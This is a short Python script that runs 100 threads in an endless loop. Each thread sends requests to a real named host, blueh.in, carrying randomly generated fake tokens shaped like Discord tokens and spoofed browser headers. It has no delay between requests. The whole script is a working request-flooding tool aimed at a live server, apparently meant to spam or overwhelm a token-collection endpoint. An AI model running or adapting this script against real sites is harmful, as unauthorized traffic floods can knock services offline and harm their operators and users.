import requests 
import threading
import random
import time

MAX_THREADS = 100
DELAY = 0

alpha = [c for c in 'abcdefghijklmnopqrstuvwxyz']
nums = [str(i) for i in range(10)]
chars = alpha \
	+ [c.upper() for c in alpha] \
	+ nums

headers = {
	'Host': 'blueh.in',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate',
	'Connection': 'close',
	'Upgrade-Insecure-Requests': '`',
	'Sec-Fetch-Dest': 'document',
	'Sec-Fetch-Mode': 'navigate',
	'Sec-Fetch-Site': 'none',
	'Sec-Fetch-User': '?1',
}

def get_fake_uid():
	return ''.join([random.choice(chars) for _ in range(24)])

def get_fake_timestamp():
	return ''.join([random.choice(chars) for _ in range(6)])

def get_fake_hmac():
	return ''.join([random.choice(chars) for _ in range(27)])

def get_fake_token():
	return f'{get_fake_uid()}.{get_fake_timestamp()}.{get_fake_hmac()}'

def spam_worker():
	while True:
		token = get_fake_token()
		r = requests.get(f'https://blueh.in/_x?{token}', headers=headers)
		print(str(r.status_code) + '\t' + token)
		time.sleep(DELAY)

threads = []
for _ in range(MAX_THREADS):
	t = threading.Thread(target=spam_worker, daemon=True)
	threads.append(t)	
	t.start()
for t in threads:
	t.join()


